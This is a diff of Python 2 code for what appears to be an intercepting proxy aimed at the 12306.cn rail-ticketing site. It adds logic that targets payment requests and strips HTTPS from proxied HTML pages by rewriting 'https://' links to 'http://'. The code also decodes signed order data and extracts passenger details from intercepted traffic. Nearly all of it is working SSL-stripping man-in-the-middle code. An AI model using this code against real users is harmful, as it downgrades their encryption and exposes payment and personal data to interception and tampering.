@@ -1,10 +1,31 @@
 # coding=utf-8
 
 from HTMLParser import HTMLParser
+from HTMLParser import HTMLParseError
 from base64 import *
-from cStringIO import StringIO
+# from urlparse import urlparse
+# from cStringIO import StringIO
+import urlparse, cStringIO
 import xml.etree.ElementTree as ET
-import sys, tty, termios, gzip
+import sys, tty, termios, gzip, zlib, string
+
+from http import * 
+
+def is_12306(req) :
+    host, port = req.getHost()
+    return host.endswith("12306.cn") 
+
+def get_12306_action(req) :
+    path = urlparse.urlparse(req.getPath()).path.strip("/ ")
+    lastSep = path.rfind("/")
+    if lastSep >= 0 : return path[lastSep+1:]
+    else : return ""
+
+def is_target(req) :
+    action = get_12306_action(req) 
+    reqParams = req.getParams() 
+    return ((action == "confirmPassengerAction.do" and reqParams["method"] == "payOrder")
+            or (action == "myOrderAction.do" and reqParams["method"] == "laterEpay"))
 
 def seat_type(no) :
     if no == "0" :
@@ -23,6 +44,84 @@ def seat_type(no) :
         return "二等座"
     return (no + ":未知座位")
 
+def remove_https(res) :
+    data = cStringIO.StringIO(res.serialize())
+    gzipped, isPage = False, False
+
+    # read headers line by line
+    line = data.readline() 
+    newdata = line 
+    while line != HTTPMessage.EOL :
+        line = data.readline() 
+        newdata += line
+        if line != HTTPMessage.EOL :
+            sep = line.find(':')
+            headname, headcont = line[:sep], line[sep+1:].strip().lower()
+            if headname.strip().lower() == "content-encoding" and headcont.find("gzip") >= 0 :
+                gzipped = True
+            if headname.strip().lower() == "content-type" and headcont.find("text/html") >= 0 :
+                isPage = True
+    if not isPage :
+        return res.serialize()
+
+    if res.isChunked() :
+        # print "remove_https(): res is chunked" 
+        chunklen = int(data.readline().strip(), 16)
+        # print "Chunk length: %d" % chunklen
+        chunk = data.read(chunklen)
+        if gzipped :
+            page = zlib.decompress(chunk, 16+zlib.MAX_WBITS)
+        else : 
+            page = chunk
+        parser = RailHttpsParser() 
+        try :
+            parser.feed(page) 
+            if gzipped :
+                resPage = parser.gzipPage() 
+            else :
+                resPage = parser.page
+            newdata += "%x" % len(resPage) + HTTPMessage.EOL
+            newdata += resPage + HTTPMessage.EOL
+            newdata += "0" + HTTPMessage.EOL + HTTPMessage.EOL
+        except HTMLParseError as pe :
+            lines = page.split("\n") 
+            print "HTMLParseError: %s, at line %d, column %d" % (pe.msg, pe.lineno, pe.offset) 
+            if pe.lineno > 2 :
+                i = pe.lineno - 2
+                for line in lines[pe.lineno-2 : pe.lineno+2] :
+                    print "%4d: %s" % (i, line)
+                    i += 1
+            else: 
+                i = 0 
+                for line in lines[0 : pe.lineno+2] :
+                    print "%4d: %s" % (i, line)
+                    i += 1
+            newdata += "%x" % chunklen + HTTPMessage.EOL
+            newdata += chunk + HTTPMessage.EOL
+            newdata += "0" + HTTPMessage.EOL + HTTPMessage.EOL
+    else : 
+        page = data.read()
+        parser = RailHttpsParser()
+        try :
+            parser.feed(page) 
+            newdata += parser.page
+        except HTMLParseError as pe :
+            lines = page.split("\n") 
+            print "HTMLParseError: %s, at line %d, column %d" % (pe.msg, pe.lineno, pe.offset) 
+            if pe.lineno > 3 :
+                i = pe.lineno - 3
+                for line in lines[pe.lineno-3 : pe.lineno+2] :
+                    print "%4d: %s" % (i+1, line)
+                    i += 1
+            else: 
+                i = 0 
+                for line in lines[0 : pe.lineno+2] :
+                    print "%4d: %s" % (i, line)
+                    i += 1
+            newdata += page
+    
+    return newdata
+
 class TicketOrder :
     def __init__(self) :
         self.amount = ""
@@ -38,6 +137,11 @@ class TicketOrder :
         return s
 
 class RailParser(HTMLParser) :
+    START_TAG = 1
+    END_TAG = 2 
+    START_END_TAG = 3
+    DATA_TAG = 4
+    
     def __init__(self) :
         self.page = "" 
         self.inOrderTable = False
@@ -59,62 +163,71 @@ class RailParser(HTMLParser) :
                 print "\t%s: %s" % (e.tag, e.text)
         return 
 
-    def handle_starttag(self, tag, attrs) :
-        if tag.lower() == "input":
-            adict = dict(attrs) 
-            if "name" in adict :
-                if adict["name"] == "tranData" :
-                    print "Signed order found:"
-                    print adict["value"]
-                    self.decodeOrder(adict["value"])
-                elif adict["name"] == "merSignMsg" :
-                    print "Order signature:"
-                    print adict["value"]
-        if self.inOrderTable :
-            if tag.lower() == "tr" :
-                if self.parsedTabRows >= 2 : 
-                    self.parsingPassenger = True 
+    def handle_rail_info(self, tag, attrs, tag_type) :
+        if tag_type == RailParser.START_TAG :
+            if tag.lower() == "input":
+                adict = dict(attrs) 
+                if "name" in adict :
+                    if adict["name"] == "tranData" :
+                        print "Signed order found:"
+                        print adict["value"]
+                        self.decodeOrder(adict["value"])
+                    elif adict["name"] == "merSignMsg" :
+                        print "Order signature:"
+                        print adict["value"]
+            if self.inOrderTable :
+                if tag.lower() == "tr" :
+                    if self.parsedTabRows >= 2 : 
+                        self.parsingPassenger = True 
+        elif tag_type == RailParser.END_TAG :
+            if self.inOrderTable :
+                if tag.lower() == "tr" :
+                    self.parsedTabRows += 1
+                    if self.parsedTabRows > 2 :
+                        self.passengerList.append(self.passenger)
+                    self.parsingPassenger = False 
+                    self.passenger = "" 
+                    self.passengerField = 0
+        elif tag_type == RailParser.DATA_TAG :
+            if (not self.inOrderTable) :
+                if tag == "订单信息" :
+                    self.inOrderTable = True
+            else: # parsing ticket order 
+                if tag.startswith("总票价") :
+                    self.inOrderTable = False
+                    self.parsingPassenger = False 
+                    self.passenger = "" 
+                    # self.order.amount = tag.strip()
+                    i = 1 
+                    for p in self.passengerList :
+                        print "%2d: %s" % (i, p) 
+                        i += 1
+                    print tag.strip() 
+                elif self.parsedTabRows >= 2 and self.parsingPassenger :
+                    if tag.strip() != "" :
+                        self.passengerField += 1
+                        if self.passengerField > 3 :
+                            self.passenger += tag.replace("\t", "").replace("\r","").replace("\n","").replace(" ","") + ", " 
+        return 
 
+    def handle_starttag(self, tag, attrs) :
+        self.handle_rail_info(tag, attrs, RailParser.START_TAG)
         self.page += self.get_starttag_text() 
         return 
 
     def handle_endtag(self, tag) :
+        self.handle_rail_info(tag, [], RailParser.END_TAG)
         self.page += "</" + tag + ">"
-        if self.inOrderTable :
-            if tag.lower() == "tr" :
-                self.parsedTabRows += 1
-                if self.parsedTabRows > 2 :
-                    self.passengerList.append(self.passenger)
-                self.parsingPassenger = False 
-                self.passenger = "" 
-                self.passengerField = 0
         return 
 
     def handle_startendtag(self, tag, attrs):
+        self.handle_rail_info(tag, attrs, RailParser.START_END_TAG)
         self.page += self.get_starttag_text() 
         return 
 
     def handle_data(self, data) :
+        self.handle_rail_info(data, [], RailParser.DATA_TAG)
         self.page += data 
-        if (not self.inOrderTable) :
-            if data == "订单信息" :
-                self.inOrderTable = True
-        else: # parsing ticket order 
-            if data.startswith("总票价") :
-                self.inOrderTable = False
-                self.parsingPassenger = False 
-                self.passenger = "" 
-                # self.order.amount = data.strip()
-                i = 1 
-                for p in self.passengerList :
-                    print "%2d: %s" % (i, p) 
-                    i += 1
-                print data.strip() 
-            elif self.parsedTabRows >= 2 and self.parsingPassenger :
-                if data.strip() != "" :
-                    self.passengerField += 1
-                    if self.passengerField > 3 :
-                        self.passenger += data.replace("\t", "").replace("\r","").replace("\n","").replace(" ","") + ", " 
         return 
 
     def handle_entityref(self, name) :
@@ -129,9 +242,37 @@ class RailParser(HTMLParser) :
         self.page += "<!--" + comment + "-->"
         return 
 
-class RailActiveParser(RailParser) :
+    def gzipPage(self) :
+        if self.page == "" :
+            return ""
+        buf = cStringIO.StringIO() 
+        zfile = gzip.GzipFile(mode="wb", fileobj=buf)
+        zfile.write(self.page) 
+        zfile.close()
+        return buf.getvalue()
+
+class RailHttpsParser(RailParser) :
     def __init__(self) :
         RailParser.__init__(self)
+
+    def handle_starttag(self, tag, attrs) :
+        self.handle_rail_info(tag, attrs, RailParser.START_TAG) 
+        self.page += string.replace(self.get_starttag_text(), "https://", "http://")
+        return 
+
+    def handle_startendtag(self, tag, attrs) :
+        self.handle_rail_info(tag, attrs, RailParser.START_END_TAG) 
+        self.page += string.replace(self.get_starttag_text(), "https://", "http://")
+        return 
+
+    def handle_data(self, data) :
+        self.handle_rail_info(data, [], RailParser.DATA_TAG) 
+        self.page += string.replace(data, "https://", "http://")
+        return 
+
+class RailActiveParser(RailHttpsParser) :
+    def __init__(self) :
+        RailHttpsParser.__init__(self)
 
     def decodeOrder(self, rawOrder) :
         order = b64decode(rawOrder)
@@ -206,15 +347,6 @@ class RailActiveParser(RailParser) :
                 if self.parsedTabRows >= 2 : 
                     self.parsingPassenger = True 
 
-        self.page += self.get_starttag_text() 
+        self.page += string.replace(self.get_starttag_text(), "https://", "http://")
         return 
-
-    def gzipPage(self) :
-        if self.page == "" :
-            return ""
-        buf = StringIO() 
-        zfile = gzip.GzipFile(mode="wb", fileobj=buf)
-        zfile.write(self.page) 
-        zfile.close()
-        return buf.getvalue()
 
